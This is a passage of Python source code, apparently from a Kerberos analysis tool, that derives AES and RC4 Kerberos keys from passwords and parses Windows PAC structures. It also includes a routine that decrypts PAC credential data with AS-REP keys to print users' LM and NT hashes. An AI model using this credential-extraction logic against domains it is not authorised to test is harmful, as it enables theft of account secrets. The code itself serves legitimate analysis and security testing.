### Kerberos Key ###
####################

def encodePwd(pwd):
	print_yellow("[*] Hex UTF-16LE encode password")
	print_yellow("---")
	print()

	try:
		print ("[+] Hex UTF-16LE encoded password = {}".format(binascii.hexlify(pwd.encode("utf-16le")).decode()))
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def computeKerberosKey(accountName, domain, hexPwd):
	print_yellow("[*] Computing Kerberos Key")
	print_yellow("---")
	print()

	try:
		if domain == None or hexPwd == None:
			print("[-] Domain FQDN and pwd required", file = sys.stderr)
			return

		# Compute SALT
		if (accountName.endswith("$")):
			SALT = domain.upper() + "host" + accountName[:-1].lower() + "." + domain.lower()
		else:
			SALT = domain.upper() + accountName
		print ("[+] Salt = {}".format (SALT))
		
		UTF8_PWD = binascii.unhexlify(hexPwd).decode('utf-16le', 'replace').encode('utf-8', 'replace')

		# eTYPE-AES256-CTS-HMAC-SHA1-96 (18)
		SEEDSIZE = 32
		ENCTYPE = 18
		BLOCKSIZE = 16
		Key = string_to_key (UTF8_PWD, SALT, None, SEEDSIZE, BLOCKSIZE, ENCTYPE)
		print ("[+] Kerberos Key of type eTYPE-AES256-CTS-HMAC-SHA1-96 (18) = {}".format (Key))

		# eTYPE-AES128-CTS-HMAC-SHA1-96 (17)
		SEEDSIZE = 16
		ENCTYPE = 17
		BLOCKSIZE = 16
		Key = string_to_key (UTF8_PWD, SALT, None, SEEDSIZE, BLOCKSIZE, ENCTYPE)
		print ("[+] Kerberos Key of type eTYPE-AES128-CTS-HMAC-SHA1-96 (17) = {}".format (Key))

		# eTYPE-ARCFOUR-HMAC-MD5 (23) = NT Hash
		Key = hashlib.new ("md4", binascii.unhexlify(hexPwd)).hexdigest()
		print ("[+] Kerberos Key of type eTYPE-ARCFOUR-HMAC-MD5 (23) = {}".format (Key))
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

###########
### PAC ###
###########

# From https://msdn.microsoft.com/library/aa302203#msdn_pac_credentials
# and http://diswww.mit.edu/menelaus.mit.edu/cvs-krb5/25862
PAC_LOGON_INFO       = 1
PAC_CREDENTIALS_INFO = 2
PAC_SERVER_CHECKSUM  = 6
PAC_PRIVSVR_CHECKSUM = 7
PAC_CLIENT_INFO_TYPE = 10
PAC_DELEGATION_INFO  = 11
PAC_UPN_DNS_INFO     = 12
PAC_ATTRIBUTES_INFO  = 17
PAC_REQUESTOR_INFO   = 18

class PA_PAC_OPTIONS (univ.Sequence):
	componentType = namedtype.NamedTypes (
		_sequence_component ('flags', 0, KerberosFlags()),
	)

class PACTYPE(Structure):
    structure = (
        ('cBuffers', '<L=0'),
        ('Version', '<L=0'),
        ('Buffers', ':'),
    )

class PAC_INFO_BUFFER(Structure):
    structure = (
        ('ulType', '<L=0'),
        ('cbBufferSize', '<L=0'),
        ('Offset', '<Q=0'),
    )

class FILETIME(ndr.NDRSTRUCT):
    structure = (
        ('dwLowDateTime', dtypes.DWORD),
        ('dwHighDateTime', dtypes.LONG),
    )

def filetimeToDate(ftime):
		# FILETIME structure (minwinbase.h)
		# Contains a 64-bit value representing the number of 100-nanosecond intervals since January 1, 1601 (UTC).
		# https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-filetime
		dwLowDateTime = ftime['dwLowDateTime']
		dwHighDateTime = ftime['dwHighDateTime']
		v_FILETIME = "Infinity (absolute time)"
		if dwLowDateTime != 0xffffffff and dwHighDateTime != 0x7fffffff:
			temp_time = dwHighDateTime
			temp_time <<= 32
			temp_time |= dwLowDateTime
			if datetime.timedelta (microseconds = temp_time / 10).total_seconds() != 0:
				v_FILETIME = (datetime.datetime (1601, 1, 1, 0, 0, 0) + datetime.timedelta (microseconds = temp_time / 10)).strftime ("%d/%m/%Y %H:%M:%S %p")
		return v_FILETIME

# Builtin known Windows Group
MsBuiltInGroups = {
	"498": "Enterprise Read-Only Domain Controllers",
	"512": "Domain Admins",
	"513": "Domain Users",
	"514": "Domain Guests",
	"515": "Domain Computers",
	"516": "Domain Controllers",
	"517": "Cert Publishers",
	"518": "Schema Admins",
	"519": "Enterprise Admins",
	"520": "Group Policy Creator Owners",
	"521": "Read-Only Domain Controllers",
	"522": "Cloneable Controllers",
	"525": "Protected Users",
	"526": "Key Admins",
	"527": "Enterprise Key Admins",
	"553": "RAS and IAS Servers",
	"571": "Allowed RODC Password Replication Group",
	"572": "Denied RODC Password Replication Group",
	"S-1-1-0": "Everyone",
	"S-1-2-0": "Local",
	"S-1-2-1": "Console Logon",
	"S-1-3-0": "Creator Owner",
	"S-1-3-1": "Creator Group",
	"S-1-3-2": "Owner Server",
	"S-1-3-3": "Group Server",
	"S-1-3-4": "Owner Rights",
	"S-1-5-1": "Dialup",
	"S-1-5-2": "Network",
	"S-1-5-3": "Batch",
	"S-1-5-4": "Interactive",
	"S-1-5-6": "Service",
	"S-1-5-7": "Anonymous Logon",
	"S-1-5-8": "Proxy",
	"S-1-5-9": "Enterprise Domain Controllers",
	"S-1-5-10": "Self",
	"S-1-5-11": "Authenticated Users",
	"S-1-5-12": "Restricted Code",
	"S-1-5-13": "Terminal Server User",
	"S-1-5-14": "Remote Interactive Logon",
	"S-1-5-15": "This Organization",
	"S-1-5-17": "IUSR",
	"S-1-5-18": "System (or LocalSystem)",
	"S-1-5-19": "NT Authority (LocalService)",
	"S-1-5-20": "Network Service",
	"S-1-5-32-544": "Administrators",
	"S-1-5-32-545": "Users",
	"S-1-5-32-546": "Guests",
	"S-1-5-32-547": "Power Users",
	"S-1-5-32-548": "Account Operators",
	"S-1-5-32-549": "Server Operators",
	"S-1-5-32-550": "Print Operators",
	"S-1-5-32-551": "Backup Operators",
	"S-1-5-32-552": "Replicators",
	"S-1-5-32-554": "Builtin\\Pre-Windows",
	"S-1-5-32-555": "Builtin\\Remote Desktop Users",
	"S-1-5-32-556": "Builtin\\Network Configuration Operators",
	"S-1-5-32-557": "Builtin\\Incoming Forest Trust Builders",
	"S-1-5-32-558": "Builtin\\Performance Monitor Users",
	"S-1-5-32-559": "Builtin\\Performance Log Users",
	"S-1-5-32-560": "Builtin\\Windows Authorization Access Group",
	"S-1-5-32-561": "Builtin\\Terminal Server License Servers",
	"S-1-5-32-562": "Builtin\\Distributed COM Users",
	"S-1-5-32-568": "Builtin\\IIS_IUSRS",
	"S-1-5-32-569": "Builtin\\Cryptographic Operators",
	"S-1-5-32-573": "Builtin\\Event Log Readers",
	"S-1-5-32-574": "Builtin\\Certificate Service DCOM Access",
	"S-1-5-32-575": "Builtin\\RDS Remote Access Servers",
	"S-1-5-32-576": "Builtin\\RDS Endpoint Servers",
	"S-1-5-32-577": "Builtin\\RDS Management Servers",
	"S-1-5-32-578": "Builtin\\Hyper-V Administrators",
	"S-1-5-32-579": "Builtin\\Access Control Assistance Operators",
	"S-1-5-32-580": "Builtin\\Remote Management Users",
	"S-1-5-64-10": "NTLM Authentication",
	"S-1-5-64-14": "SChannel Authentication",
	"S-1-5-64-21": "Digest Authentication",
	"S-1-5-80": "NT Service",
	"S-1-5-80-0": "All Services",
	"S-1-5-83-0": "NT VIRTUAL MACHINE\\Virtual Machines",
	"S-1-5-113": "Local Account",
	"S-1-5-114": "Local Account and member of Administrators group",
	"S-1-5-1000": "Other Organization",
	"S-1-15-2-1": "All app packages",
	"S-1-16-0": "ML Untrusted",
	"S-1-16-4096": "ML Low",
	"S-1-16-8192": "ML Medium",
	"S-1-16-8448": "ML Medium Plus",
	"S-1-16-12288": "ML High",
	"S-1-16-16384": "ML System",
	"S-1-16-20480": "ML Protected Process",
	"S-1-16-28672": "ML Secure Process",
	"S-1-18-1": "Authentication authority asserted identity",
	"S-1-18-2": "Service asserted identity",
	"S-1-18-3": "Fresh public key identity",
	"S-1-18-4": "Key trust identity",
	"S-1-18-5": "Key property MFA",
	"S-1-18-6": "Key property attestation",
}

def groupMembershipArrayToNames(groupMembershipArray):
	if groupMembershipArray == b"":
		return "<Empty>"
	else:
		return [(groupMembership["RelativeId"], MsBuiltInGroups.get(str(groupMembership["RelativeId"]), "<Unknown>")) for groupMembership in groupMembershipArray]

class SE_GROUP_Attributes(Enum):
	SE_GROUP_MANDATORY = 0x00000001
	SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002
	SE_GROUP_ENABLED = 0x00000004

def kerbSidAndAttributesArrayToNames(ksas):
	extraSids = []
	for ksa in ksas:
		sid = ksa['Sid']
		attributes = ksa['Attributes']
		attributesFlags = []
		for flag in SE_GROUP_Attributes:
			if attributes & flag.value:
				attributesFlags.append(flag.name)
		extraSids.append("%s (%s)" % (sid.formatCanonical(), ', '.join(attributesFlags)))

	return extraSids

class User_Flags(Enum):
	LOGON_EXTRA_SIDS = 0x0020
	LOGON_RESOURCE_GROUPS = 0x0200      
	
def userFlagsToNames(userFlags):
	names = []
	for flag in User_Flags:
		if userFlags & flag.value:
			names.append(flag.name)
	return "(%s) %s" % (userFlags, ", ".join(names)) 

class USER_ACCOUNT_Codes(Enum):
	USER_ACCOUNT_DISABLED = 0x00000001
	USER_HOME_DIRECTORY_REQUIRED = 0x00000002
	USER_PASSWORD_NOT_REQUIRED = 0x00000004
	USER_TEMP_DUPLICATE_ACCOUNT = 0x00000008
	USER_NORMAL_ACCOUNT = 0x00000010
	USER_MNS_LOGON_ACCOUNT = 0x00000020
	USER_INTERDOMAIN_TRUST_ACCOUNT = 0x00000040
	USER_WORKSTATION_TRUST_ACCOUNT = 0x00000080
	USER_SERVER_TRUST_ACCOUNT = 0x00000100
	USER_DONT_EXPIRE_PASSWORD = 0x00000200
	USER_ACCOUNT_AUTO_LOCKED = 0x00000400
	USER_ENCRYPTED_TEXT_PASSWORD_ALLOWED = 0x00000800
	USER_SMARTCARD_REQUIRED = 0x00001000
	USER_TRUSTED_FOR_DELEGATION = 0x00002000
	USER_NOT_DELEGATED = 0x00004000
	USER_USE_DES_KEY_ONLY = 0x00008000
	USER_DONT_REQUIRE_PREAUTH = 0x00010000
	USER_PASSWORD_EXPIRED = 0x00020000
	USER_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 0x00040000
	USER_NO_AUTH_DATA_REQUIRED = 0x00080000
	USER_PARTIAL_SECRETS_ACCOUNT = 0x00100000
	USER_USE_AES_KEYS = 0x00200000

def uacValToNames(uacVal):
	return f"({str(uacVal)}) " + "|".join([entry.name for entry in USER_ACCOUNT_Codes if entry.value & uacVal])

class DWORD_ARRAY(ndr.NDRUniConformantArray):
    item = '<L'

# This SID structure is a packet representation of the SID type for use by block protocols
class SID_IDENTIFIER_AUTHORITY(Structure):
    structure = (
        ('Value', '6s'),
    )

class SID(Structure):
    structure = (
        ('Revision', '<B'),
        ('SubAuthorityCount', '<B'),
        ('IdentifierAuthority', ':', SID_IDENTIFIER_AUTHORITY),
        ('SubLen', '_-SubAuthority', 'self["SubAuthorityCount"]*4'),
        ('SubAuthority', ':'),
    )

    def formatCanonical(self):
        ans = 'S-%d-%d' % (self['Revision'], ord(self['IdentifierAuthority']['Value'][5:6]))
        for i in range(self['SubAuthorityCount']):
            ans += '-%d' % (unpack('<L', self['SubAuthority'][i * 4:i * 4 + 4])[0])
        return ans

    def fromCanonical(self, canonical):
        items = canonical.split('-')
        self['Revision'] = int(items[1])
        self['IdentifierAuthority'] = SID_IDENTIFIER_AUTHORITY()
        self['IdentifierAuthority']['Value'] = b'\x00\x00\x00\x00\x00' + pack('B', int(items[2]))
        self['SubAuthorityCount'] = len(items) - 3
        self['SubAuthority'] = b''
        for i in range(self['SubAuthorityCount']):
            self['SubAuthority'] += pack('<L', int(items[i + 3]))

# The RPC_SID structure is an IDL representation of the SID type for use by RPC-based protocols
class RPC_SID_IDENTIFIER_AUTHORITY(ndr.NDRUniFixedArray):
    align = 1
    align64 = 1
    def getDataLen(self, data, offset=0):
        return 6

class RPC_SID(ndr.NDRSTRUCT):
    structure = (
        ('Revision', ndr.NDRSMALL),
        ('SubAuthorityCount', ndr.NDRSMALL),
        ('IdentifierAuthority', dtypes.RPC_SID_IDENTIFIER_AUTHORITY),
        ('SubAuthority', DWORD_ARRAY),
    )

    def getData(self, soFar = 0):
        self['SubAuthorityCount'] = len(self['SubAuthority'])
        return ndr.NDRSTRUCT.getData(self, soFar)

    def fromCanonical(self, canonical):
        items = canonical.split('-')
        self['Revision'] = int(items[1])
        self['IdentifierAuthority'] = b'\x00\x00\x00\x00\x00' + pack('B', int(items[2]))
        self['SubAuthorityCount'] = len(items) - 3
        for i in range(self['SubAuthorityCount']):
            self['SubAuthority'].append(int(items[i+3]))

    def formatCanonical(self):
        ans = 'S-%d-%d' % (self['Revision'], ord(self['IdentifierAuthority'][5:6]))
        for i in range(self['SubAuthorityCount']):
            ans += '-%d' % self['SubAuthority'][i]
        return ans

class PAC_CLIENT_INFO(Structure):
    structure = (
        ('ClientId', '<Q=0'),
        ('NameLength', '<H=0'),
        ('_Name', '_-Name', 'self["NameLength"]'),
        ('Name', ':'),
    )

class Upn_Dns_Flags (Enum):
	U_UsernameOnly = 0x00000001
	S_SidSamSupplied = 0x00000002

class UPN_DNS_INFO(Structure):
    structure = (
        ('UpnLength', '<H=0'),
        ('UpnOffset', '<H=0'),
        ('DnsDomainNameLength', '<H=0'),
        ('DnsDomainNameOffset', '<H=0'),
        ('Flags', '<L=0')
    )

# Full struct including additional fields (use this structure when S Flag is set)
class UPN_DNS_INFO_FULL(Structure):
    structure = (
        ('UpnLength', '<H=0'),
        ('UpnOffset', '<H=0'),
        ('DnsDomainNameLength', '<H=0'),
        ('DnsDomainNameOffset', '<H=0'),
        ('Flags', '<L=0'),
        ('SamNameLength', '<H=0'),
        ('SamNameOffset', '<H=0'),
        ('SidLength', '<H=0'),
        ('SidOffset', '<H=0'),
    )

class ChecksumTypes(Enum):
	rsa_md5_des       = 8
	rsa_md4_des       = 4
	hmac_md5          = -138
	hmac_sha1_des3_kd = 12
	hmac_sha1_96_aes128 = 15
	hmac_sha1_96_aes256 = 16

class PAC_SIGNATURE_DATA(Structure):
    structure = (
        ('SignatureType', '<l=0'),
        ('Signature', ':'),
    )

class PAC_CREDENTIAL_INFO(Structure):
    structure = (
        ('Version', '<L=0'),
        ('EncryptionType', '<L=0'),
        ('SerializedData', ':'),
    )

class UCHAR_ARRAY(ndr.NDRUniConformantArray):
    item = 'c'

class PUCHAR_ARRAY(ndr.NDRPOINTER):
    referent = (
        ('Data', UCHAR_ARRAY),
    )

class SECPKG_SUPPLEMENTAL_CRED(ndr.NDRSTRUCT):
    structure = (
        ('PackageName', dtypes.RPC_UNICODE_STRING),
        ('CredentialSize', dtypes.ULONG),
        ('Credentials', PUCHAR_ARRAY),
    )

class SECPKG_SUPPLEMENTAL_CRED_ARRAY(ndr.NDRUniConformantArray):
    item = SECPKG_SUPPLEMENTAL_CRED

class PAC_CREDENTIAL_DATA(ndr.NDRSTRUCT):
    structure = (
        ('CredentialCount', dtypes.ULONG),
        ('Credentials', SECPKG_SUPPLEMENTAL_CRED_ARRAY),
    )

class NTLM_SUPPLEMENTAL_CREDENTIAL(ndr.NDRSTRUCT):
    structure = (
        ('Version', dtypes.ULONG),
        ('Flags', dtypes.ULONG),
        ('LmPassword', '16s=b""'),
        ('NtPassword', '16s=b""'),
    )

class Attributes_Flags(Enum):
	PAC_WAS_REQUESTED = 0x00000001
	PAC_WAS_GIVEN_IMPLICITLY = 0x00000002

class PAC_ATTRIBUTE_INFO(ndr.NDRSTRUCT):
    structure = (
        ('FlagsLength', dtypes.ULONG),
        ('Flags', dtypes.ULONG),
    )

class PAC_REQUESTOR(Structure):
    structure = (
        ('UserSid', ':', SID), # Using SID rather than RPC_SID (see https://github.com/SecureAuthCorp/impacket/issues/1386)
    )

class GROUP_MEMBERSHIP(ndr.NDRSTRUCT):
    structure = (
        ('RelativeId', dtypes.ULONG),
        ('Attributes', dtypes.ULONG),
    )

class GROUP_MEMBERSHIP_ARRAY(ndr.NDRUniConformantArray):
    item = GROUP_MEMBERSHIP

class PGROUP_MEMBERSHIP_ARRAY(ndr.NDRPOINTER):
    referent = (
        ('Data', GROUP_MEMBERSHIP_ARRAY),
    )

class CHAR_FIXED_8_ARRAY(ndr.NDRUniFixedArray):
    def getDataLen(self, data, offset=0):
        return 8

class CYPHER_BLOCK(ndr.NDRSTRUCT):
    structure = (
        ('Data', '8s=b""'),
    )

    def getAlignment(self):
        return 1

class CYPHER_BLOCK_ARRAY(ndr.NDRUniFixedArray):
    def getDataLen(self, data, offset = 0):
        return len(CYPHER_BLOCK())*2

class LM_OWF_PASSWORD(ndr.NDRSTRUCT):
    structure = (
        ('Data', CYPHER_BLOCK_ARRAY),
    )

USER_SESSION_KEY = LM_OWF_PASSWORD

PISID = dtypes.PRPC_SID

class KERB_SID_AND_ATTRIBUTES(ndr.NDRSTRUCT):
    structure = (
        ('Sid', PISID),
        ('Attributes', dtypes.ULONG),
    )

class KERB_SID_AND_ATTRIBUTES_ARRAY(ndr.NDRUniConformantArray):
    item = KERB_SID_AND_ATTRIBUTES

class PKERB_SID_AND_ATTRIBUTES_ARRAY(ndr.NDRPOINTER):
    referent = (
        ('Data', KERB_SID_AND_ATTRIBUTES_ARRAY),
    )

class KERB_VALIDATION_INFO(ndr.NDRSTRUCT):
    structure = (
        ('LogonTime', FILETIME),
        ('LogoffTime', FILETIME),
        ('KickOffTime', FILETIME),
        ('PasswordLastSet', FILETIME),
        ('PasswordCanChange', FILETIME),
        ('PasswordMustChange', FILETIME),
        ('EffectiveName', dtypes.RPC_UNICODE_STRING),
        ('FullName', dtypes.RPC_UNICODE_STRING),
        ('LogonScript', dtypes.RPC_UNICODE_STRING),
        ('ProfilePath', dtypes.RPC_UNICODE_STRING),
        ('HomeDirectory', dtypes.RPC_UNICODE_STRING),
        ('HomeDirectoryDrive', dtypes.RPC_UNICODE_STRING),
        ('LogonCount', dtypes.USHORT),
        ('BadPasswordCount', dtypes.USHORT),
        ('UserId', dtypes.ULONG),
        ('PrimaryGroupId', dtypes.ULONG),
        ('GroupCount', dtypes.ULONG),
        ('GroupIds', PGROUP_MEMBERSHIP_ARRAY),
        ('UserFlags', dtypes.ULONG),
        ('UserSessionKey', USER_SESSION_KEY),
        ('LogonServer', dtypes.RPC_UNICODE_STRING),
        ('LogonDomainName', dtypes.RPC_UNICODE_STRING),
        ('LogonDomainId', dtypes.PRPC_SID),

        # Also called Reserved1
        ('LMKey', CHAR_FIXED_8_ARRAY),

        ('UserAccountControl', dtypes.ULONG),
        ('SubAuthStatus', dtypes.ULONG),
        ('LastSuccessfulILogon', FILETIME),
        ('LastFailedILogon', FILETIME),
        ('FailedILogonCount', dtypes.ULONG),
        ('Reserved3', dtypes.ULONG),

        ('SidCount', dtypes.ULONG),
        # ('ExtraSids', PNETLOGON_SID_AND_ATTRIBUTES_ARRAY),
        ('ExtraSids', PKERB_SID_AND_ATTRIBUTES_ARRAY),
        ('ResourceGroupDomainSid', PISID),
        ('ResourceGroupCount', dtypes.ULONG),
        ('ResourceGroupIds', PGROUP_MEMBERSHIP_ARRAY),
    )

class RPC_UNICODE_STRING_ARRAY(ndr.NDRUniConformantArray):
    item = dtypes.RPC_UNICODE_STRING

class PRPC_UNICODE_STRING_ARRAY(ndr.NDRPOINTER):
    referent = (
        ('Data', RPC_UNICODE_STRING_ARRAY),
    )

class S4U_DELEGATION_INFO(ndr.NDRSTRUCT):
    structure = (
        ('S4U2proxyTarget', dtypes.RPC_UNICODE_STRING),
        ('TransitedListSize', dtypes.ULONG),
        ('S4UTransitedServices', PRPC_UNICODE_STRING_ARRAY ),
    )

class CommonHeader(ndr.NDRSTRUCT):
    structure = (
        ('Version', dtypes.UCHAR),
        ('Endianness', dtypes.UCHAR),
        ('CommonHeaderLength', dtypes.USHORT),
        ('Filler', dtypes.ULONG),
    )
    def __init__(self, data = None, isNDR64 = False):
        ndr.NDRSTRUCT.__init__(self, data, isNDR64)
        if data is None:
            self['Version'] = 1
            self['Endianness'] = 0x10
            self['CommonHeaderLength'] = 8
            self['Filler'] = 0xcccccccc

class PrivateHeader(ndr.NDRSTRUCT):
    structure = (
        ('ObjectBufferLength', dtypes.ULONG),
        ('Filler', dtypes.ULONG),
    )
    def __init__(self, data = None, isNDR64 = False):
        ndr.NDRSTRUCT.__init__(self, data, isNDR64)
        if data is None:
            self['Filler'] = 0xcccccccc

class TypeSerialization1(ndr.NDRSTRUCT):
    commonHdr = (
        ('CommonHeader', CommonHeader),
        ('PrivateHeader', PrivateHeader),
    )

    def getData(self, soFar = 0):
        self['PrivateHeader']['ObjectBufferLength'] = len(ndr.NDRSTRUCT.getData(self, soFar)) + len(
            ndr.NDRSTRUCT.getDataReferents(self, soFar)) - len(self['CommonHeader']) - len(self['PrivateHeader'])
        return ndr.NDRSTRUCT.getData(self, soFar)

class PKERB_VALIDATION_INFO(ndr.NDRPOINTER):
    referent = (
        ('Data', KERB_VALIDATION_INFO),
    )

class VALIDATION_INFO(TypeSerialization1):
    structure = (
        ('Data', PKERB_VALIDATION_INFO),
    )

class PAC_SIGNATURE_DATA(Structure):
    structure = (
        ('SignatureType', '<l=0'),
        ('Signature', ':'),
    )

class PAC_CLIENT_INFO(Structure):
    structure = (
        ('ClientId', '<Q=0'),
        ('NameLength', '<H=0'),
        ('_Name', '_-Name', 'self["NameLength"]'),
        ('Name', ':'),
    )

def parsePAC(authorization_data, hexASRepEncKeys = None):
	pacType = PACTYPE (authorization_data)
	buff = pacType['Buffers']

	for bufferN in range (pacType['cBuffers']):
		infoBuffer = PAC_INFO_BUFFER (buff)
		data = pacType['Buffers'][infoBuffer['Offset']-8:][:infoBuffer['cbBufferSize']]
		if infoBuffer['ulType'] == PAC_LOGON_INFO:
			try:
				print ("[+] PAC_LOGON_INFO")
				type1 = TypeSerialization1 (data)
				newdata = data[len(type1)+4:]
				kerbInfo = KERB_VALIDATION_INFO()
				kerbInfo.fromString(newdata)
				kerbInfo.fromStringReferents(newdata[len(kerbInfo.getData()):])
				print ("\t[+] UTC Logon time = {}".format (filetimeToDate(kerbInfo['LogonTime'])))
				print ("\t[+] UTC Logoff time = {}".format (filetimeToDate(kerbInfo['LogoffTime'])))
				print ("\t[+] UTC KickOff time = {}".format (filetimeToDate(kerbInfo['KickOffTime'])))
				print ("\t[+] UTC Password last set time = {}".format (filetimeToDate(kerbInfo['PasswordLastSet'])))
				print ("\t[+] UTC Password can change time = {}".format (filetimeToDate(kerbInfo['PasswordCanChange'])))
				print ("\t[+] UTC Password must change time = {}".format (filetimeToDate(kerbInfo['PasswordMustChange'])))
				print ("\t[+] Effective name = {}".format (kerbInfo['EffectiveName'] if kerbInfo['EffectiveName'] != '' else "<Empty>"))
				print ("\t[+] Full name = {}".format (kerbInfo['FullName'] if kerbInfo['FullName'] != '' else "<Empty>"))
				print ("\t[+] Logon script = {}".format (kerbInfo['LogonScript'] if kerbInfo['LogonScript'] != '' else "<Empty>"))
				print ("\t[+] Profile path = {}".format (kerbInfo['ProfilePath'] if kerbInfo['ProfilePath'] != '' else "<Empty>"))
				print ("\t[+] Home directory = {}".format (kerbInfo['HomeDirectory'] if kerbInfo['HomeDirectory'] != '' else "<Empty>"))
				print ("\t[+] Home directory drive = {}".format (kerbInfo['HomeDirectoryDrive'] if kerbInfo['HomeDirectoryDrive'] != '' else "<Empty>"))
				print ("\t[+] Logon count = {}".format (kerbInfo['LogonCount']))
				print ("\t[+] Bad password count = {}".format (kerbInfo['BadPasswordCount']))
				print ("\t[+] User ID = {}".format (kerbInfo['UserId']))
				print ("\t[+] Primary group ID = {}".format (kerbInfo['PrimaryGroupId']))
				print ("\t[+] Groups IDs = {}".format (groupMembershipArrayToNames(kerbInfo['GroupIds'])))
				print ("\t[+] User flags = {}".format (userFlagsToNames(kerbInfo['UserFlags'])))
				print ("\t[+] User Session Key = {}".format (binascii.hexlify (kerbInfo['UserSessionKey']).decode()))
				print ("\t[+] Logon server = {}".format (kerbInfo['LogonServer'] if kerbInfo['LogonServer'] != '' else "<Empty>"))
				print ("\t[+] Logon domain name = {}".format (kerbInfo['LogonDomainName'] if kerbInfo['LogonDomainName'] != '' else "<Empty>"))
				print ("\t[+] Logon domain SID = {}".format (kerbInfo['LogonDomainId'].formatCanonical()))
				print ("\t[+] LM Key = {}".format (binascii.hexlify (kerbInfo['LMKey']).decode()))
				print ("\t[+] User account codes = {}".format (uacValToNames(kerbInfo['UserAccountControl'])))
				print ("\t[+] Sub auth status = {}".format (kerbInfo['SubAuthStatus']))
				print ("\t[+] UTC Last successful ILogon time = {}".format (filetimeToDate(kerbInfo['LastSuccessfulILogon'])))
				print ("\t[+] UTC Last failed ILogon time = {}".format (filetimeToDate(kerbInfo['LastFailedILogon'])))
				print ("\t[+] Failed ILogon count = {}".format (kerbInfo['FailedILogonCount']))
				print ("\t[+] Extra SIDs = {}".format (kerbSidAndAttributesArrayToNames(kerbInfo['ExtraSids'])))
				print ("\t[+] Resource group domain SID = {}".format (kerbInfo['ResourceGroupDomainSid'].formatCanonical() if kerbInfo['ResourceGroupDomainSid'] != b'' else "<Empty>"))
				print ("\t[+] Resource group IDs = {}".format (groupMembershipArrayToNames(kerbInfo['ResourceGroupIds'])))
			except Exception as e:
				print(f"\t[-] Failed to parse PAC_LOGON_INFO: {str(e)}")
		if infoBuffer['ulType'] == PAC_CLIENT_INFO_TYPE:
			print ("[+] PAC_CLIENT_INFO")
			clientInfo = PAC_CLIENT_INFO (data)
			try:
				clientID = filetimeToDate(clientInfo['ClientId'])
			except:
				clientID = filetimeToDate(FILETIME(data[:32]))
			print ("\t[+] UTC Client ID = {}".format (clientID))
			print ("\t[+] Client name = {}".format (clientInfo['Name'].decode('utf-16-le')))
		elif infoBuffer['ulType'] == PAC_UPN_DNS_INFO:
			print ("[+] PAC_UPN_DNS_INFO")
			upn = UPN_DNS_INFO (data)
			UpnName = data[upn['UpnOffset']:upn['UpnOffset'] + upn['UpnLength']].decode ('utf-16le')
			DnsName = data[upn['DnsDomainNameOffset']:upn['DnsDomainNameOffset'] + upn['DnsDomainNameLength']].decode ('utf-16le')
			attrFlags = []
			for entry in Upn_Dns_Flags:
				if (upn['Flags'] & entry.value):
					attrFlags.append (entry.name)
			Flags = f"({upn['Flags']}) {', '.join (attrFlags)}"
			print ("\t[+] UPN = {}".format (UpnName))
			print ("\t[+] DNS domain name = {}".format (DnsName))
			print ("\t[+] Flags = {}".format (Flags))

			# Depending on the flag supplied, additional data may be supplied
			if Upn_Dns_Flags.S_SidSamSupplied.name in attrFlags:
				# SamAccountName and Sid is also supplied
				upn = UPN_DNS_INFO_FULL (data)
				SamName = data[upn['SamNameOffset']:upn['SamNameOffset']+upn['SamNameLength']].decode ('utf-16le')
				Sid = RPC_SID(data[upn['SidOffset']:upn['SidOffset'] + upn['SidLength']])
				print ("\t[+] SAM account name = {}".format (SamName))
				print ("\t[+] User SID = {}".format (Sid.formatCanonical()))
		elif infoBuffer['ulType'] == PAC_SERVER_CHECKSUM:
			print ("[+] PAC_SERVER_CHECKSUM")
			sigData = PAC_SIGNATURE_DATA (data)
			print ("\t[+] Signature type = {}".format (ChecksumTypes (sigData['SignatureType'])))
			print ("\t[+] Server checksum = {}".format (binascii.hexlify (sigData['Signature']).decode()))
		elif infoBuffer['ulType'] == PAC_PRIVSVR_CHECKSUM:
			print ("[+] PAC_PRIVSVR_CHECKSUM")
			sigData = PAC_SIGNATURE_DATA (data)
			print ("\t[+] Signature type = {}".format (ChecksumTypes (sigData['SignatureType'])))
			print ("\t[+] KDC checksum = {}".format (binascii.hexlify (sigData['Signature']).decode()))
		elif infoBuffer['ulType'] == PAC_CREDENTIALS_INFO:
			print ("[+] PAC_CREDENTIALS_INFO")
			credInfo = PAC_CREDENTIAL_INFO (data)
			version = "0x%x" % (credInfo['Version'])
			encType = "(0x%x %s)" % (credInfo['EncryptionType'], EncryptionTypes (int (credInfo['EncryptionType'])).name)
			print ("\t[+] Credential info version = {}".format (version))
			print ("\t[+] Credential info encryption type = {}".format (encType))
			if hexASRepEncKeys == None:
				print ("\t[-] No AS-Rep Encryption Key supplied to decrypt NTLM credentials", file = sys.stderr)
			else:
				KEYUSAGE = 16
				decrypted = False
				
				for hexASRepEncKey in hexASRepEncKeys:
					try:
						cipherDecrypted, confounder = ENCTYPE_TABLE[credInfo['EncryptionType']].decrypt(binascii.unhexlify (hexASRepEncKey), KEYUSAGE, credInfo['SerializedData'])
						type1 = TypeSerialization1 (cipherDecrypted)
						credData = PAC_CREDENTIAL_DATA (cipherDecrypted[24:])
						decrypted = True
						break
					except:
						pass
				
				if not decrypted:
					print("\t[-] Failed to decrypt NTLM credentials with provided AS-Rep Encryption Key(s)", file = sys.stderr)
				else:
					for credential in credData['Credentials']:
						print ("\t[+] Package name = {}".format (credential['PackageName']['Data']))
						ntlmCred = NTLM_SUPPLEMENTAL_CREDENTIAL (credential['Credentials'])
						print ("\t\t[+] Version = {}".format (ntlmCred['Version']))
						print ("\t\t[+] Flags = {}".format (ntlmCred['Flags']))
						print ("\t\t[+] LM Hash = {}".format (binascii.hexlify (ntlmCred['LmPassword']).decode()))
						print ("\t\t[+] NT Hash = {}".format (binascii.hexlify (ntlmCred['NtPassword']).decode()))
		elif infoBuffer['ulType'] == PAC_DELEGATION_INFO:
			print("[+] PAC_DELEGATION_INFO")
			delegationInfo = S4U_DELEGATION_INFO(data)
			print("\t[+] S4U2proxyTarget = {}".format(delegationInfo['S4U2proxyTarget']))
			print("\t[+] TransitedListSize = {}".format(delegationInfo['TransitedListSize']))
